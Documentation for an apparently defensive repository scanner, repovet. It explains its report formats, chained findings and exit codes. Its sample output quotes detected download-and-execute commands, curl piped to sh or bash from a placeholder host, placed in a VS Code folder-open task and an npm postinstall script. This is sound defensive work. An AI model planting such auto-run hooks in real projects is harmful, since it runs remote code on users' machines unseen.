# Reports and exit codes

- [Sample output](#sample-output)
- [Reports: text, HTML, JSON and SARIF](#reports-text-html-json-and-sarif)
- [Exit codes](#exit-codes)

## Sample output

An excerpt from a real scan of a small test folder (path shortened, the URLs are
placeholders):

```
repovet 0.4.0 · local folder D:\src\demo · offline · 7 files · 135 rules
Lines starting with '>' are untrusted content quoted from the repository.

┌─ SUMMARY ───────────────────────────────────────────────────────────────────┐
│ Do not open this folder in VS Code with trust (use Restricted Mode) until   │
│ you have read the findings below.                                           │
│                                                                             │
│ 1 critical · 3 high · 0 medium · 0 low · 0 info                             │
│                                                                             │
│ Look at these first                                                         │
│ 1. CRITICAL  RC-AUTO-021   .vscode/tasks.json:7                             │
│    VS Code task that runs on folder open downloads or executes code         │
│ 2. HIGH      RC-AUTO-020   .vscode/tasks.json:8                             │
│    VS Code task runs when the folder is opened                              │
│ 3. HIGH      RC-AUTO-090   package.json:1                                   │
│    Auto-run entry point reaches dangerous code in another file              │
└─────────────────────────────────────────────────────────────────────────────┘

DANGER                                   1 critical · 3 high
  CRITICAL  RC-AUTO-021   .vscode/tasks.json:7                  confidence high
            Task starts on folder open and fetches or runs code: curl -s
            https://example.invalid/i.sh | sh
            > "command": "curl -s https://example.invalid/i.sh | sh",
            Why  This task starts as soon as the folder is opened in a trusted
                 workspace, and it downloads code, pipes into an interpreter or
                 decodes a payload.
            Do   Do not trust this folder in VS Code. Open it in Restricted
                 Mode or another editor and remove the task before working with
                 it.

  ...

  HIGH      RC-AUTO-090   package.json:1                      confidence medium
            npm install script runs on install and reaches download-and-execute
            (RC-DLX-001) after 2 steps: package.json -> scripts/setup.js
            Path chain-1: package.json:1 -> scripts/setup.js:2
            > execSync("curl -fsSL https://example.invalid/setup.sh | bash");
            Why  The entry point runs automatically and starts a file of the
                 repository, which in turn contains the dangerous code
                 (directly or through one more file). Each file on its own
                 looks less alarming than the combination. The findings of the
                 files on the path stay in the report, marked as part of this
                 chain, and are not counted again.
            Do   Follow the path and read each file before opening the folder
                 with trust or installing. The quoted line is the code at the
                 end of the path.

  ...

  MEDIUM    RC-AUTO-001   package.json:1 (part of chain-1)      confidence high
            package.json defines a 'postinstall' script: node scripts/setup.js
            > {"name": "demo", "version": "1.0.0", "scripts": {"postinstall": "node scripts/setup.js"}}

  MEDIUM    RC-DLX-001    scripts/setup.js:2 (part of chain-1)  confidence medium
            Downloads and runs code in one step: curl -fsSL
            https://example.invalid/setup.sh | bash
            > execSync("curl -fsSL https://example.invalid/setup.sh | bash");

Why/Do for medium, low and info findings, all places and info details: --details

NOT CHECKED
  - trust (GitHub API): no GitHub repository is known for this folder (no Git
    remote in .git/config)
  - Environment and tool cache folders (.venv, venv, node_modules, .tox, .nox,
    .mypy_cache, .ruff_cache, .pytest_cache) skipped; use --include-env-dirs to
    check them (1): node_modules
  - No .git folder; the Git history was not checked
  - Dependencies are checked by name and declared source only; their code and
    install scripts are not checked (no registry queries) (2): package.json,
    requirements.txt

repovet reports only what its 135 rules detect in the checked scope.
A missing finding is not proof that the repository is safe.
```

Each finding has a rule ID, severity, confidence, file and line (where it applies), the
reason (`Why`) and a recommendation (`Do`). The report is compact by default:

- The **summary box** starts with what not to do yet, based on the most severe
  findings (for example "Do not open this folder in VS Code with trust"), counts the
  findings per level and names the three to look at first (the most severe; at the same
  level, findings outside tests, docs, examples and vendored code come first).
- Findings of the same rule are **grouped**: one explanation, a list of places with the
  quoted line, at most five, then `+N more`. Info findings are one line per rule.
- A **chain** (`RC-AUTO-090`) connects an entry point that runs automatically (a VS Code
  task on folder open, a dev container command, an npm install script) with dangerous
  code in a file it starts, up to two files away, and shows the path. The findings on
  the path stay in the report, marked `(part of chain-1)`, and are not counted again.
- `Why` and `Do` are shown for **critical and high** findings; `--details` shows them for
  all findings, and every place.
- Findings in test files, docs, examples or vendored code carry a **label** such as
  `[test]`. They are labelled, never hidden or downgraded: attackers put payloads there
  too.

Text quoted from the repository is masked before output: control characters and
invisible Unicode characters are shown as `<U+XXXX>`, so they cannot change your terminal
or mislead a reader. Without UTF-8 output, the box and the separators use plain ASCII.

Before "Not checked", the report shows the provenance profile. It describes the
repository; it is not a finding and not a quality score (same demo folder):

```
PROVENANCE PROFILE                       facts, not findings
  Files      7 files, 543 bytes; 7 text files with 20 lines, 0 binary
  Languages  JavaScript 54% (1 file), TypeScript 25% (1 file), Python 20% (1
             file)
  Data, docs JSON (2), Text (1), Markdown (1)
  Largest    .vscode/tasks.json (208 bytes), scripts/setup.js (111 bytes),
             package.json (90 bytes)
  Top level  .vscode/, scripts/, src/, tests/, package.json, README.md,
             requirements.txt
  Present    readme, tests
  Missing    license, CI, docs, changelog, contributing guide, security policy,
             code of conduct, code owners, dependency update bot
  License    no license file found
  Notable    editor and IDE settings (1): .vscode/tasks.json
             package manifests (2): package.json, requirements.txt
```

The trust profile, which comes before the provenance profile when the GitHub API is
used, is described in [trust.md](trust.md).

## Reports: text, HTML, JSON and SARIF

- **Text** (default): see [Sample output](#sample-output).
- **HTML** (`--format html -o report.html`): one self-contained file to open in any
  browser, also offline. No JavaScript and no external resources (a Content Security
  Policy blocks everything but the inline style sheet); every text from the repository is
  masked and escaped. Findings are grouped and fold open (critical and high are open),
  with severity colours, the profiles, "Not checked" and the notice. Light and dark mode
  follow your system setting.

- **JSON** (`--format json`): tool, target, scan data, a summary per severity and
  category, the findings, the coverage gaps ("Not checked"), facts (`source` for URL
  targets, `trust` and `provenance` profiles) and the disclaimer. The structure is
  described in [report.schema.json](report.schema.json) (`schema_version` 1.5; every
  finding has a `context` label or `null`; a chain finding has `chain` with its steps,
  the findings on its path name it in `in_chain`, and the summary counts them once,
  through the chain).
- **SARIF 2.1.0** (`--format sarif`) for GitHub code scanning and SARIF viewers: every
  rule with title, reason, recommendation and `security-severity`; context labels in
  `properties.context`; the steps of a chain as `relatedLocations`; `critical`/`high`
  findings have level `error`, `medium` `warning`, `low`/`info` `note`. Paths are relative
  to `SRCROOT` (the checked folder). Coverage gaps appear as tool execution notifications.
  Findings that concern a whole file point to line 1. The trust and provenance profiles
  are in `runs[0].properties.facts`. For URL targets, `SRCROOT` is the GitHub URL of the
  checked commit.

JSON and SARIF contain only ASCII: text from the repository is sanitized like in the
terminal report, and file paths in SARIF are percent-encoded. `--min-severity` filters
all formats; the exit code never depends on the format.

Reports of `repovet diff` (schema 1.0, [diff.schema.json](diff.schema.json)) are
described in [the diff guide](diff.md).

## Exit codes

The exit codes are a stable interface for scripts and CI:

| Code | Meaning                                                                         |
|------|---------------------------------------------------------------------------------|
| 0    | No findings at or above `--fail-on` (this does not mean the repository is safe) |
| 1    | At least one finding at or above `--fail-on`                                     |
| 2    | Usage error: invalid arguments, target not found, invalid rules file, unsupported URL |
| 3    | Analysis aborted: download failed or hit a limit, internal error, interruption; for `clone` also a path that may not be written or a write error |

`repovet clone` returns the result of its check (0 or 1) whether or not it cloned; a
declined clone returns 0 without and 1 with findings at or above `--fail-on`. Without a
terminal, 1 always means that nothing was cloned. The menu returns the result of the
last check (0 without one) and 3 on Ctrl+C.

For `repovet diff`, 1 means a new or worsened finding reached `--fail-on` and 3 means the
comparison is incomplete; see [the diff guide](diff.md#findings-and-the-gate).
